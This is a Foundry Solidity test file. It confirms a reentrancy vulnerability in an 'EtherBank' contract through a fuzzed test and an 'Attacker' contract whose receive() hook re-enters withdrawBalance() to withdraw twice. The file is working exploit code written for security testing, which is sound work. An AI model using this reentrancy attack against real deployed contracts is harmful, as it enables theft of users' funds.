
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherBank} from "../src/EtherBank.sol";

contract TestReentrancyEtherBank is Test {
    EtherBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state needed beyond funding

        // --- 3. Funding ---
        // Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 2);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherBank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = EtherBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into EtherBank to set up the attack
        victim.addToBalance{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State - store attacker's balance before attack
        initialSnapshot = address(this).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;

        // 3. Call the vulnerable function
        victim.withdrawBalance();

        // 4. Verify Success Conditions
        // If we received more than our initial deposit, the attack succeeded
        // Due to reentrancy, we should have withdrawn twice (2 * val)
        // but only deposited once (val), so we gain val extra
        if (address(this).balance >= initialSnapshot + storedAttackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter the vulnerable withdrawBalance function
            victim.withdrawBalance();
        }
    }
}
